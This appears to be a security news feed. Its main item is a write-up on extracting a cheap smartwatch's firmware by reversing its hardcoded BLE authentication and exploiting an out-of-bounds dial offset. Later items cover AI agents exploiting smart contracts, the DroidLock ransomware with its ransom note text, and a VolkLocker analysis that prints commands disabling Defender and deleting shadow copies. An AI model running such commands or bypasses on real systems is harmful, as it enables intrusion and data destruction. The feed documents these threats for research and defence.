Damien and Thomas (introduced later in this post) gave a talk on this subject at this year's leHACK edition in Paris.It could have been a Christmas story!  We were visiting one of our local stores in December 2024 when we saw a shelf filled with tiny smartwatches in their boxes with a price label reading "€11.99/each". It was the kind of price we regularly see on AliExpress or Amazon for cheap smartwatches that are known to be scams or at least of very poor quality. This raised our suspicion, so we bought three of them to have a look once Christmas and New Year's Eve would be over. In fact, it was long after Christmas that we finally found some time to tear apart one of these watches and got our curiosity piqued. Some quick tests showed that this watch's sensors were not really good at measuring the blood pressure or track sleep activity, at least for a good reason:
It appeared there were no such sensors in this watch. At least none positioned close enough to the wrist to measure light reflection as this
type of sensor usually does.Something was definitely odd about this device, and this was the starting point of a long and unexpected journey into the smartwatch's internals.First things first, we had a look at the printed circuit board () and discovered that the device uses some a SoC from . A quick search on the Internet showed that  has this bad habit of adding markings on their IC that don't directly tell what sort of chip it is . But at least, we knew for sure that this SoC is from , and two test points marked  and  on the PCB indicated how the firmware might have been flashed into the SoC (a hidden USB port exposing its two data lines usually called  and , or sometimes  and ).After some research, we identified a proprietary  programmer that may be able to grab the firmware out of this watch, if we could get our hands on it. We found a programmer for sale on AliExpress with a projected delivery time of about four weeks, which was way too much time to wait for someone who likes solving puzzles. We tried some DIY alternatives but none of them worked against this target. Well, it looked like we had no other choice than to order one of these programmers and patiently wait for it to get delivered, with the hope it would work as expected and extract some valuable bytes out of 's SoC.In the meantime, we decided to try the smartwatch's official Android application and have a look at its features.We installed it on a dedicated smartphone, followed the tutorial and got our brand new smartwatch paired with one of our phones.  After some exploration we realized that unfortunately, its firmware could not be upgraded through the application.  More precisely, the application does not show information about the device's firmware nor its version, but at least it features an online store where one can buy customized dials for a small amount, and even download some of them for free. We downloaded a free custom dial and managed to push it to the smartwatch. After nearly two minutes of uploading, it was satisfying to see it displayed correctly on the watch's screen.  But as we watched the upload percentage slowly increase on the screen, we found it strange that such a small custom dial would take so long to upload to the watch. Using 's  application installed on a phone, we looked for a BLE device in the vicinity with a good signal strength and identified one that corresponded to this watch. Well, this thing uses Bluetooth Low Energy, advertises itself and even accepts connections!  We managed to connect to it, but it was pointless since we had no idea of what data is expected by the watch or how the discovered GATT services and characteristics are used to exchange data. Bluetooth Low Energy also makes sense and explains why the upload process is quite slow with this watch, as its default  is 23 bytes...Since the official application does not seem to offer a way to update our smartwatch's firmware, maybe  has some kind of standard OTA feature it might rely on, we thought. We found some public Github repositories belonging to 's Github account, and among them one looked very promising: .An APK file is available for download, we retrieved it and installed it on our phone and searched for any compatible devices. Our smartwatch was detected as a compatible device by the mobile application, meaning it exposes at least an over-the-air update service through its Bluetooth Low Energy GATT server that we could use to access its firmware. This Android application is quite verbose and gives a lot of details about what it does during a connection to a compatible device, as shown in the logcat extract below (edited for clarity):I ota:RcspAuth: -startAuth- device = name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX

's OTA application implements an authentication mechanism in what looks like a handshake, before doing anything else.
Based on the captured logcat output, we can summarize this authenticated handshake as follows:APP sends a buffer composed of 17 bytes to the device, with the first byte set to .Device replies with a different buffer of 17 bytes, this time starting with a byte set to .APP sends a buffer of 5 bytes to the device, starting with a byte set to 0x02 and followed by ASCII characters that read
   "pass".Device responds with a new buffer of 17 bytes starting with .APP sends another buffer of 17 bytes starting with .Device responds with a 5-byte buffer starting with  followed by four ASCII characters that read "pass".From what we saw, it was quite obvious we were facing some kind of mutual authentication algorithm. The application first initiates an authentication step, sending some data to the remote device and waiting for an answer. Based on this answer, it determines if the authentication is correct or not (in our case it sent a "pass" response to the device to notify a successful authentication). Once the application has authenticated the device, the same mechanism is initiated by the smartwatch. The remote device answers the authentication result message previously sent by a new buffer of 17 bytes, which is received by the application that immediately responds with another buffer of 17 bytes. The watch then checks the validity of the received data and notifies the application about the result of this last authentication step with a "pass".Once this is done, both the application and the smarttwatch know for sure that both devices are legitimate and that they can proceed with various OTA operations.It was then clear than we needed to figure out exactly how this authentication is performed in order to play with our watch's OTA service and maybe get our hands on its firmware. It was time to dig deeper into the APK's code, and we already knew where to look thanks to the verbose output.We started with the source code available from the 's OTA Android application's repository we previously found, and identified many references to an  class that seemed to be in charge of the mutual authentication mechanism.The code extract below shows the main interesting parts of this file (Chinese comments have been left as they appear in the original):The  method initializes the Bluetooth connection's parameters while most of the other methods forward any received data to the parent class, . This class is defined in a library called jl_bt_ota_V1.9.2-release-aar.jar available in the repository as a pre-compiled  file. It was time to fire up  and see what was inside this library. Decompilation failed on some parts of this library, but the com.jieli.jl_bt_ota.impl.RcspAuth class looked very interesting as it implements the authentication mechanism we were looking for. 's  method is indeed the one that starts the authentication from the application side, by generating a 16-byte random buffer with the  method, and sending it to the remote device prefixed with a null byte:Even if  struggled decompiling the rest of this method, we noticed that once the application gets a response from the device it checks it against some  returned by a call to , which is a wrapper that calls .It was then clear what the application was doing with this first authentication step. First, it calls the  to generate a random 16-byte challenge to send to the remote device, and effectively sends it prefixed with a null byte. Once the device responds to that challenge, the previously generated random buffer is passed to the  method that returns the expected data if the device knew some shared secret. If the buffer sent by the device matches the one returned by , then the device passed the authentication check. If not, an error is returned.This is a simple challenge-based authentication based on what appears to be a shared secret key, but we didn't have any idea about the algorithm used to compute the expected data from the generated challenge. To make things worse, we noticed that both the  and  methods are implemented in a native library loaded by the  class: As expected, a native JNI library called  is shipped within the APK, implementing all the cryptographic functions we were looking for. We disassembled this library in Ghidra and had a look at the two functions of interest,  and . The  function generates a random buffer based on a series of calls to , without even calling  to seed it (this is a known security problem):The  function however is based on some cryptographic algorithm:We noticed that this function calls the  function with two fixed buffers, one composed of 6 bytes and another one composed of 16 bytes. Initially, it was unclear what this  function was about but after some research we identified it as the  function defined in the Bluetooth specification and used as its legacy authentication algorithm.  This  function relies on a secret 16-byte key, the identity of a device defined as its  Bluetooth address (6 bytes), and a 16-byte random challenge. Our  function accepts a single parameter and we know for sure that it is a random challenge sent by the application, so this function must somehow reference the two other inputs to compute the corresponding . The first parameter passed to  points to a 6-byte buffer defined as follows:        BYTE_ARRAY_001055b0                              XREF[2]:     getEncryptedAuthData:00102fbc(*),
                                                                      getEncryptedAuthData:00103000(*)

           001055b4 [4]            22h, 11h
This is an hardcoded device identity corresponding to the Bluetooth address .The second buffer corresponds to a secret key stored in this library and defined as follows:        BYTE_ARRAY_001055b6                              XREF[3]:     FUN_00102eb0:00102f1c(W),

Well, it looks like we finally figured out how the  authentication data is generated!However, we needed to find an existing implementation of  to save us some time. Luckily,  wrote a Python version of this function for his BIAS research paper  and we only needed to re-use this implementation to check if the data captured in the debug output from the application matched the one produced by the recovered algorithm and its  values:When we ran this Python script, we were pleased to see that the computed value was exactly the same as the one returned by the watch!$python3auth.py

JieLiauthOK!
The use of the Bluetooth's  legacy authentication function with two hardcoded secret values turned this function into some kind of hashing function. This does not protect at all against man-in-the-middle. replay or TOCTOU attacks, as an attacker doesn't even need to know these secret values:All they need is a legitimate smartwatch to forward the challenge to and get the response from to make the target application believe any spoofed device is a legitimate one.We replicated this authentication mechanism using a Python script based on WHAD, and managed to successfully perform the handshake. We then dug into 's OTA features, but after looking for some interesting piece of code, we had to face the hard truth: there is no way to retrieve the firmware  the device through OTA!Did we reverse this authentication mechanism for nothing, just to discover afterwards that this OTA feature could not be used to extract the device's firmware? Definitely.This kind of failure happens from time to time. We were so hypnotized by the idea of getting privileged access to the device through its dedicated firmware upgrade feature, that we completely forgot to take a step back and think. We dived deep into what we thought would give us access to this piece of code we were looking for, until it failed.But in cybersecurity, we know for sure there is always a way to break in and access the information we need, even when nothing seems to work as expected. Because this is exactly when we think we may not be able to get what we want that creativity kicks in, and sometimes brings unexpected solutions to unexpected problems. In , a book written by  Michal Zalewski (who also goes by the handle ) and published in 2005, there is this cool story about an unexpected data leakage through . In 2002, Joe Loughry from Lockheed Martin Space Systems and David A. Umphress from Auburn University published a research paper entitled Information Leakage from Optical Emanations revealing that many network devices were leaking data... through their traffic monitoring LEDs. These LEDs were often called , a name coming from an old WWII joke, and most of them were simply driven by the transmit and receive data lines of such equipment. What a better way for monitoring traffic than seeing it with your own eyes? Anyone with an apparatus able to capture the light emitted by those LEDs could easily recover all data going through, no physical access required. This design weakness was present in various network equipment they discovered, and nobody thought it was a very bad design idea until this paper was published.'s OTA feature does not want to let us in? Nevermind, we will find another way to retrieve this smartwatch's firmware.We decided to focus on the watch's custom dials, as there should be some specifically formatted data we could modify, and see where that would lead us to. It took some time to find a vulnerability and determine how to exploit it, but we were not expecting this  story to be the spark that allowed us to successfully extract the watch's firmware!  We first made the hypothesis that those dials, since they seem to be animated, may contain some code to implement the logic of these animations. If there was code in dials, then it would be easy to patch one of them to get some arbitrary code executed, after guessing the main CPU's architecture. To achieve this, we needed to know how those dials are formatted and how they are indeed sent to the watch and figure out a way to abuse this feature.We managed to capture the data sent by the mobile application during an upload of a free  with  into a PCAP file, analyzed the exchanged data and noticed something familiar:  The data sent by our smartwatch through a BLE notification, , rang a bell. It was the exact same data we received from the watch when performing the OTA authentication with 's OTA Android application! A quick look at the data exchanged between the Android application and the smartwatch revealed that it was the exact same authentication mechanism used prior to upload a custom , and we were lucky to have reverse-engineered this mechanism and implemented some Python script to mimick it.Once this authentication step is performed and the application authorized by the smartwatch, the  is sent over BLE through a series of write operations performed on a specific characteristic. The first write operation specifies the number of data chunks that will follow, and the next writes transmit the dial file's content by blocks of 16 bytes. The upload process is slow as the application only sends 16 bytes of data at a time, and depending on the Bluetooth Low Energy connection's settings it may vary from one smartphone to another. The first write operation sent by the application to the watch is structured as follows:Number of chunks (big endian)Dallas 8-bit CRC, computed on previous bytesEach chunk sent after this header follows this structure:Chunk ID starting from 0 (big endian)Once the last chunk is received, the smartwatch sets the received  as its  and displays it. After having figured out how a  is sent over BLE, we wrote some Python script to extract the header and all the chunks sent by the application and saved the recovered data into a file for further analysis. We did the same for different  in order to perform a , based on the fact the more different types of  we have the easiest it would be to guess the generic structure they follow.With the few binary files collected from  sent to the smartwatch, we compared their structure and figured out their different fields and some of their meanings. Before going into the details of this structure we must warn our readers that our original hypothesis regarding these  - the fact they  contain active code executed by the smartwatch - was quickly destroyed when we had a look at the collected files. In fact, our analysis revealed that no code was required to animate those , as the animated parts were simply one of the many features supported by the smartwatch. But we kept reverse-engineering this format as parsers are generally prone to malformed data and sometimes could be abused to achieve code execution. are composed of different types of , each  describing an item to show on screen. We identified some
of these region types during our analysis, including but not limited to:hours: displays the number of hours in a 2 digit format with a specific font.minutes: displays the number of minutes in a 2 digit format with a specific font.animated clock: renders a ticking clock, including hour and minute needles as well as the clock body.battery level: renders a graphic representation of the current battery level.simple picture: displays an image on screen.Each  has its own coordinates, width and height encoded in a dedicated header, as well as other information depending on its type (color indicating transparency, alpha channel, format of pixels in image, etc.). The example below shows how these  are defined right after a fixed header, and where the data associated with those regions is stored.We noticed an interesting characteristic in this format: the headers use offsets to locate other pieces of information that the firmware must parse to render the dial correctly. From experience, we know  that using such offsets requires strict boundary checks to avoid reading out of the dial's binary content, and these checks are sometimes poorly implemented or simply missing. We thought it might be a good first test to run against the watch, but we first needed to craft a small custom dial of our own.Our analysis of the  data format gave us a lot of information about how to create one from scratch. We decided to craft a special one to check if our understanding of both a 's format and the way it is sent over BLE were correct, with the intended goal of showing a carefully selected picture on the tiny screen of our smartwatch. If this worked as expected, then we would be able to have fun with those offsets.A standard image defined in a  can be encoded using various formats, we decided to go with the one we identified in a high quality , using an image encoded in  (64k colors). The  pixel format is pretty standard in the embedded world and especially well-known from developers that create code to draw on TFT or OLED screens. Each pixel's color is defined by the quantity of the three primary colors of light: red, green and blue. Those colors are mixed altogether based on the quantity defined for each of them to produce the required color. A 24 bits-per-pixel bitmap will encode the quantity of red, green and blue of each pixel on 8 bits each, resulting in a pixel stored on 3 bytes, or 24 bits.The  pixel format uses a different encoding based on 5 bits for red and blue and 6 bits for green, resulting in a 2-byte or 16 bits value per pixel. This format is easier to manipulate and images require less memory to be stored. We converted our carefully selected picture found on the
Internet into its -encoded version, after having it cropped to the screen size, and created a custom region in our special dial. We generated a valid header based on this image and ended up with what looked like a valid  designed to only show our picture on screen.This script produced a custom  that we needed to upload to our smartwatch. We wrote another Python script using  that connected to the watch, performed the mandatory authentication step and eventually uploaded the dial following the format we recovered from our previous analysis. Unfortunately, our first try ended up in a timeout as it took too long to send the whole picture, and the smartwatch rejected our upload. After too much time spent investigating the matter, we found a way to speed things up by forcing  to use a very short  value when initiating a connection to our smartwatch, resulting in shorter  and therefore a faster upload speed.The final upload process is showed below (video has been edited, upload speed has been improved but is still slow):We knew at this moment that our work on reverse-engineering the  format and the associated upload process was correct, and that it was time to move on to more interesting ideas, like playing with those  we previously noticed. We decided to fuzz them a bit and see how a  with an image pointing to a bad offset would be decoded and what could be the result on screen. Targeting an  image region was the simplest thing to do, as we had a script to generate a  containing such a region and the only thing we had to change was a specific offset value. Also, targeting the pixel data of an image displayed on screen would cause the screen to show arbitrary data if by chance the offset corresponds to a valid memory address and the firmware blindly read data and transfered it to the screen.  Thomas Cougnard (also known as ), who had been following our progress so far, decided to join us and found some specific offset values that did not brick the device and led to some weird images displayed by the watch:As expected, the parser did not check if the specified offset pointed outside of the 's binary data and simply considered that was the expected image's pixel data and sent it to screen. When we saw this, we knew exactly what to do to extract this smartwatch's memory and get our hands on the firmware... This time, we had a TFT screen showing some pixels encoded using the standard  format, directly taken from the SoC's memory, instead of LEDs.A TFT screen embeds a small controller that drives a matrix of RGB LEDs, using its own temporary memory (RAM) to store the screen state and a specific protocol to allow an external system to drive the screen and set pixels at a specific rate. Thomas opted for an optical attack like the original paper, targeting the screen's LED matrix and creating a specific rig to extract data from all those LEDs (which is far more complex than what the authors of the original paper used during their research). He set up a specific rig to capture the displayed pixels and infer the data sent to the screen, but also had to play with the dial image's resolution to ease data recovery. In the meantime, Damien took another path, as TFT screens rely on well-known controllers like Sitronix's  or 's venerable , but sometimes also on different or unknown controllers that speak different , electronically speaking.  If we managed to figure out which controller was present in the smartwatch's screen and to capture the data sent by the SoC to this controller, we would had been able to capture the pixels sent to our screen and therefore to dump the content of any arbitrary memory region, like others did with those old network's cards and their LEDs but without all the issues caused by those tiny RGB LEDs and any bias introduced by a complex optical sensor.This attack was pretty simple to perform on paper, but also had some practical limitations we needed to figure out:At what speed those pixels are sent to the screen?Is it a serial or a parallel interface used by the SoC to control the screen?How are the pixels sent to the screen and in which order?There was no other way to find out than to connect a logic analyzer to the screen data lines, by soldering multiple .1mm diameter wires to the connector and analyzing the data sent back to the screen. The screen connector's pinout was unknown, so we first tried to determine how the controller was connected to the SoC, given the fact our logic analyzer was a cheap one (the best one being unavailable at this time). We managed to capture some data when sampling at 8 Ms/s, but the decoded data made no sense. This was due to the high frequency on this communication bus that left our logic analyzer way out of sync. We used a  Raspberry Pi Pico as an alternate logic analyzer, thanks to Agustín Gimenez Bernad's 100 Msps Pico-based logic analyzer project.This time, we captured the suspected data lines with a 100 Ms/s rate and successfully decoded some standard TFT screen commands supported by a wide range of controllers. In fact, the SoC uses a 25 MHz clock to drive the screen, which is pretty fast.The screen controller has been guessed from its specific device ID response sent when it receives a  command (0x04), namely a  screen controller. Once the controller known and the interface pinout and speed determined, the only thing we had to do was to decode every command related to a screen update operation and capture the data. Thomas tested different setups but failed at getting a decent optical sensor able to extract reliable data from pixels on screen. Since Damien's setup was somehow getting data that could be interpreted as valid commands, they agreed to use it to get the firmware out of the watch.We used the same Raspberry Pi Pico to capture the data sent by the main SoC to the screen because this tiny microcontroller has a lot of advantages:it can be overclocked to 200 MHz (it has officially been tested at 200 MHz and proven stable by the Raspberry Pi Foundation)it provides a pretty neat feature to perform low-level decoding called it features a more than decent amount of RAM (264 kB)its development environment and related toolchain are well-known and easy to useOur idea was to sniff the data sent to the screen with a dedicated  program, save it into RAM and then send it to our host computer once the data recovered through the Pico's serial port exposed through its USB connector. We wrote the following  program to sample a bit on the screen's serial data line each time we see a raising edge on the clock line, and bits are pushed inside an internal 32-bit shift register:Since the interface bus is clocked at 25 MHz and it takes some cycles for this PIO program to be run, we had to keep it as small as possible. In fact, this program is composed of two instructions:a  instruction waiting for a rising edge on the clock GPIO (configured as an input)a read on the data GPIO, that is then clocked in a 32-bit internal shift register In the meantime, the clock line is back to a low logic level and the next  is blocking until the next clock's rising edge. This allows sampling 32 bits from the interface bus as fast as possible, and the Pico's main program only has to wait for each 32 bits values acquired by our  program and save them in RAM:The buffer used to save data captured from the screen interface has a capacity of 145000 bytes in order to leave some memory available while allowing enough data to be collected to grab a full screen update from the main SoC. Once the buffer fills, it is sent in hexadecimal form to the host computer through its CDC ACM serial port, which is pretty fast even if virtually clocked at 115.200 bauds.On the host computer, we ran a small Python script designed to collect the data sent back by the Pico and save it as a binary blob in a target file. It was then easy to collect the data sent when a screen with a bad offset was sent to the smartwatch and displayed and investigate this data to determine how the system updates the screen.We identified a pattern that is quite common with TFT screens based on three commands used to set the  and  addresses (using respectively  and  as their command byte), followed by a command used to send the pixel data corresponding to the specified region ():We had everything we needed to capture all the pixels's data sent to screen and therefore to extract the firmware, we only needed to design a set of tools to capture portions of memory and then rebuild the whole firmware from them.First, we designed a specific header in order to quickly identify the data corresponding to the top of the screen, making it starting and ending with some magic bytes and occupy the top two lines of the screen. We also added into this header the memory address corresponding to the address of the data read by the firmware and sent to screen, based on our probable guess. We wrote a dedicated Python function to generate this:This small structure will be dumped by our tool and found at the beginning of the extracted data, allowing us to check that we did not have any bit shift based on both the defined  and trailing magic bytes , but also to recover the address associated with the captured data. This Python code was used to generate a set of valid  for successive memory addresses that were uploaded one after the other while we dumped the data sent to the screen with another python script:We managed to extract the firmware slice after slice, each slice ended up in a dedicated file. Once all the files gathered, we wrote a final script to rebuild the whole firmware in a single binary file that would allow us to analyze it and later disassemble it:And we ended up with what looked like a 2 MB firmware file that matches some regular  firmware as specified in Kagaimiq's documentation.This cheap smartwatch based on some obscure system-on-chip gave us a hard time figuring out how to extract its firmware. We could have used the official programmer sold by  but since we could not afford waiting several weeks to get our hands on it, we found an unexpected way to get
access to the firmware by exploiting an out-of-bounds read combined with a custom rig based on a cheap Raspberry Pi Pico.It was a very good opportunity to test the limits of a Pico overclocked at 200 MHz but also to use its powerful programmable inputs/outputs () to speed things up. We could have used an expensive logic analyzer to capture screen updates and decode data from them, but in the end we found this solution easier to set up as it only requires a few lines of C and Python to implement an efficient capture rig that costs almost nothing. It also demonstrates once more that cheap hardware can often be used to achieve attacks on embedded systems, and that some old tricks used to leak data out of a system are still useful when facing recent technology!With the firmware successfully extracted from the system-on-chip's memory, the fun part could start: identifying functions in charge of measuring and showing on screen the vitals and figuring out how those values are calculated, but that's a story for another time 😉.We'd like to thank Thomas Cougnard () for his collaboration on this unexpected study of this smartwatch and for the ups and downs he went through while testing random offsets, almost bricking his watch multiple times (he eventually managed to bring it back to life). We also would like to thank  for the awesome documentation they released on their Github repository, that helped a lot to figure out how JieLi's SoCs are designed and how one can interact with them, as well as the various data formats used by most chips.]]></content:encoded></item><item><title>Village of Golf Manor considering paying ransom amid cyberattack (1)</title><link>https://databreaches.net/2025/12/11/village-of-golf-manor-considering-paying-ransom-amid-cyberattack/?pk_campaign=feed&amp;pk_kwd=village-of-golf-manor-considering-paying-ransom-amid-cyberattack</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 11 Dec 2025 17:36:13 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Empirical Analysis: Non-Linear Token Consumption in AI Security Agents</title><link>https://aliasrobotics.com/case-study-unlimited-ai-security.php</link><author>/u/Obvious-Language4462</author><category>netsec</category><pubDate>Thu, 11 Dec 2025 17:11:53 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
              Modern AI-based security workloads are increasingly intensive, iterative, and data-driven. Professionals rely on AI agents for tasks such as log triage, vulnerability research, exploit development, incident investigation, and continuous monitoring. These workflows routinely trigger deep reasoning sequences that cannot be predicted or artificially constrained.
            
              In this landscape, many pay-per-use AI security tools — Competitor 1, Competitor 2, and similar metered-billing providers — rely on token-metered pricing models, forcing users to pay for every interaction and making operational costs volatile and difficult to forecast.
            
              As a result, users face a dilemma: either limit their own operations to control budget, or absorb unexpectedly high monthly usage costs—both of which undermine the purpose of using AI for security.
            
              CAI PRO addresses this fundamentally by offering unlimited usage with predictable pricing, enabling stable, uninterrupted security workflows without the volatility of consumption-based competitors.

But what is the economic impact of these capabilities? In a recent MATS and Anthropic Fellows project, our scholars investigated this question by evaluating AI agents’ ability to exploit smart contracts on Smart CONtracts Exploitation benchmark (SCONE-bench)­a new benchmark they built comprising 405 contracts that were actually exploited between 2020 and 2025. On contracts exploited after the latest knowledge cutoffs (June 2025 for Opus 4.5 and March 2025 for other models), Claude Opus 4.5, Claude Sonnet 4.5, and GPT-5 developed exploits collectively worth $4.6 million, establishing a concrete lower bound for the economic harm these capabilities could enable. Going beyond retrospective analysis, we evaluated both Sonnet 4.5 and GPT-5 in simulation against 2,849 recently deployed contracts without any known vulnerabilities. Both agents uncovered two novel zero-day vulnerabilities and produced exploits worth $3,694, with GPT-5 doing so at an API cost of $3,476.

The malware, named DroidLock, takes over a device and then holds it for ransom. The campaign to date has primarily targeted Spanish-speaking users, but researchers warn it could spread.DroidLock is delivered via phishing sites that trick users into installing a malicious app pretending to be, for example, a telecom provider or other familiar brand. The app is really a dropper that installs malware able to take complete control of the device by abusing  and  permissions.Once the victim grants accessibility permission, the malware starts approving additional permissions on its own. This can include access to SMS, call logs, contacts, and audio, which gives attackers more leverage in a ransom demand.DroidLock also leverages Accessibility Services to create overlays on other apps. The overlays can capture device unlock patterns (giving the attacker full access) and also show a fake Android update screen, instructing victims not to power off or restart their devices.DroidLock uses Virtual Network Computing (VNC) for remote access and control. With this, attackers can control the device in real time, including starting camera, muting sound, manipulating notifications, and uninstalling apps, and use overlays to capture lock patterns and app credentials. They can also deny access to the device by changing the PIN.The researchers warn that:“Once installed, DroidLock can wipe devices, change PINs, intercept OTPs (One-Time Passwords), and remotely control the user interface”Unlike regular ransomware, DroidLock doesn’t encrypt files. But by blocking access and threatening to destroy everything unless a ransom is paid, it reaches the same outcome.Urgent Last chanceTime remaining {starts at 24 hours}After this all files wil be deleted forever!Your files will be permanently destroyed!Contact us immediately at this email or lose everything forever: {email address}Include your device ID {ID}Payment required within 24 hoursNo police, no recovery tools, no tricksEvery second counts!If this campaign turns out to be successful in Spain, we’ll undoubtedly see it emerge in other countries as well. So here are a few pointers to stay safe:Only install apps from official app stores and avoid installing apps promoted in links in SMS, email, or messaging apps., verify the developer name, number of downloads, and user reviews rather than trusting a single promotional link.Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware.Does an app really need the permissions it’s requesting to do the job you want it to do?

After seemingly lying dormant for most of 2025 due to Telegram enforcement actions, the group returned in August with a new RaaS offering called VolkLocker ( CyberVolk 2.x).In this post, we examine the functionality of VolkLocker, including its Telegram-based automation, encryption mechanisms, and affiliate features. Our analysis reveals .VolkLocker payloads are written in Golang, with versions supporting both Linux and Windows. Base builds are shipped without obfuscation, and RaaS operators are encouraged to use UPX for packing rather than being offered native crypting or packing features as is common with many other RaaS offerings.Operators building new VolkLocker payloads must provide a bitcoin address, Telegram bot token ID, Telegram chat ID, encryption deadline, desired file extension, and self-destruct options.Upon launch, the ransomware checks its execution context and attempts privilege escalation if needed. Escalation uses the “ms-settings” UAC bypass technique (T1548.002), hijacking the HKCU\Software\Classes\ms-settings\shell\open\command registry key to execute with elevated privileges.The malware performs environmental discovery and system enumeration, including process enumeration for virtual environment detection and hardware-based identification.VolkLocker checks the local MAC address against known virtualization vendor prefixes. Registry locations associated with VirtualBox and VMware are also queried. Oracle Corporation (VirtualBox)  Oracle Corporation (VirtualBox) Once initialized, the ransomware enumerates all available drives (A: through Z:) and determines which files to encrypt based on exclusion lists for specific paths and extensions configured in the VolkLocker code.VolkLocker uses AES-256 in GCM mode (Galois/Counter Mode) for file encryption. When the ransomware identifies a target file, it initializes an encryption engine using a 32-byte master key decoded from a 64-character hex string embedded in the binary.For each file, the malware generates a random 12-byte nonce for the initialization vector using Golang’s  package. The file is encrypted using the GCM Seal operation, which prepends the 12-byte nonce to the ciphertext and appends a 16-byte authentication tag. The original file is marked for deletion, and the encrypted file receives a custom extension (e.g., , ).Critical Design Flaw | Plaintext Key BackupVolkLocker does not generate encryption keys dynamically. Instead, master keys are hardcoded as hex strings within the binaries. The same master key encrypts all files on a victim system.Critically, this master key is also written to a plaintext file in the  folder, creating a trivial decryption pathway for victims who discover it.This design flaw exists in the  function, which executes during initialization and performs the following:Constructs a file path at  (typically C:\Users\\AppData\Local\Temp\system_backup.key)Writes a plaintext file containing the victim’s unique identifier, the complete master encryption key, and the attacker’s Bitcoin addressApplies Windows Hidden and System file attributes to obscure the file from casual directory listingsThe file format is:
User: CV<16 hex characters>
Key: <64 hex characters - THE MASTER KEY>
BTC: <attacker's bitcoin address>
Since the ransomware never deletes this backup key file, victims could attempt file recovery by extracting the necessary values from the file.The plaintext key backup likely represents a test artifact inadvertently shipped in production builds. CyberVolk operators may be unaware that affiliates are deploying builds with the  function still embedded. Given that VolkLocker is a relatively new service, the presence of what appears to be debug functionality in live deployments suggests that the operation is struggling to maintain quality control while aggressively recruiting lesser-skilled affiliates.System Lockdown & Persistence FeaturesVolkLocker modifies multiple registry keys to inhibit system recovery and analysis:reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f
In addition, Windows Defender is targeted for termination via PowerShell:powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
sc config WinDefend start= disabled
net stop WinDefend /y
The malware also terminates processes associated with common analysis tools via :VolkLocker creates multiple identical copies of itself in various system locations to establish persistence:    %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cvolk.exe
    %PUBLIC%\Documents\svchost.exe
    %SYSTEMDRIVE%\ProgramData\Microsoft\Network\wlanext.exe
    %TEMP%\WindowsUpdate.exe
Ransom Note and Countdown TimerVolkLocker’s ransom note is a dynamic HTML application. The file  is written to  and launched both after encryption completes and upon system startup. The ransom note displays a countdown timer with a default duration of 48 hours. The duration of the timer can be configured by the RaaS operators.The JavaScript-based countdown timer is purely cosmetic. When it reaches zero, the  function displays a shake animation and the message “ SYSTEM DESTROYED .”However, a separate enforcement timer operates independently of the browser-based display.This enforcement timer is synchronized with the system clock using Golang’s  function. When it expires, it calls the  and  functions. The same destructive routine triggers if an incorrect decryption key is provided more than the configured  value. The default is three times.File & Backup Destruction MechanismDuring system destruction, VolkLocker deletes the following folders from the user profile:The malware also deletes Volume Shadow Copies:vssadmin delete shadows /all /quiet
Finally, VolkLocker triggers a BSOD (Blue Screen of Death) after a 10-second delay by calling  with a specific status code.All aspects of the CyberVolk RaaS are managed through Telegram. Prospective customers and operational queries are directed to the main bot (CyberVolk_Kbot).VolkLocker payloads include built-in Telegram automation for command and control. This aligns with CyberVolk’s operational model, where all communication, purchasing, and support occur through Telegram, a model the actors see as a “market differentiator”.The default Telegram C2 supports the following commands:Message all infected victimsMessage specific victim IDsShow administrative panelGet victim system informationThe Telegram C2 is customizable. Some CyberVolk operators have published examples that include additional capabilities, such as keylogging control.The  function alerts operators upon new infections, similar to Telegram-enabled infostealers. When a host is infected, basic system information and a screenshot are sent to the configured Telegram chat.Expanded Services and PricingCyberVolk has expanded beyond ransomware. In November 2025, operators began advertising standalone RAT and keylogger tools, with the following advertised pricing model:RaaS (single OS): $800-$1,100 USDRaaS (Linux + Windows): $1,600-$2,200 USDStandalone RAT or Keylogger: $500 USD eachIntelligence suggests bundle discounts are available for customers purchasing multiple services.Despite repeated Telegram account bans and channel removals throughout 2025, CyberVolk has reestablished its operations and expanded its service offerings.However, storing master encryption keys in plaintext is a significant design blunder that undermines the ransomware’s effectiveness, allowing victims to recover files without acceding to the threat actor’s ransom demand.Nevertheless, defenders should see CyberVolk’s adoption of Telegram-based automation as a reflection of broader trends among politically-motivated threat actors. These groups continue to lower barriers for ransomware deployment while operating on platforms that provide convenient infrastructure for criminal services.The SentinelOne Singularity Endpoint Platform currently detects and prevents malicious behaviors and artifacts associated with CyberVolk Ransomware attacks.CyberVolk (VolkLocker 2025) Linux

